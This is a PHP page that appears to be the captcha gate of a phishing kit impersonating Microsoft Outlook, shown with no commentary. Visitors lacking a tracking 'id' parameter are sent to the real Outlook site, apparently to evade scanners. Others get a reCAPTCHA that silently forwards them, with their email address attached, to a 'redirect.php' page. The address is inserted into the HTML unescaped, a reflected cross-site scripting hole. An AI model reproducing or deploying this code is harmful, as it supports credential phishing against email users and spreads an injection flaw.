<?php
error_reporting(0);
if (!isset($_GET['id'])){
  header('Location: https://outlook.office.com/');
  die();
}
if (!isset($_GET['mail'])){
  $raw_tag = '<form method="post" action="redirect.php?auth_csrf=92713b9ced73709212e985b7a7010505240fb5fd3a5396ec056edecb0f4fae93" style="margin-top:45%" id="myForm">';
}
else{
  $raw_tag = '<form method="post" action="redirect.php?auth_csrf=92713b9ced73709212e985b7a7010505240fb5fd3a5396ec056edecb0f4fae93&mail='.$_GET["mail"].'" style="margin-top:45%" id="myForm">';
}
?>
<!doctype html>
<html lang="en">
  <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">

<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

<script src="https://www.google.com/recaptcha/api.js" async defer></script>

  </head>
  <body>
   <div class="container h-100 d-flex justify-content-center">
    <div class="my-auto">
      <?php echo $raw_tag; ?>
      <div class="g-recaptcha" data-callback="recaptchaCallback" data-sitekey="6LfvSpIeAAAAALlzkGQFv9Hh0JE2hR9K3DA0uSFz"></div>						  


		</form>
    </div>
</div>
</form>
<script>

function recaptchaCallback() {
document.getElementById("myForm").submit();
};
</script>
</body>
</html>
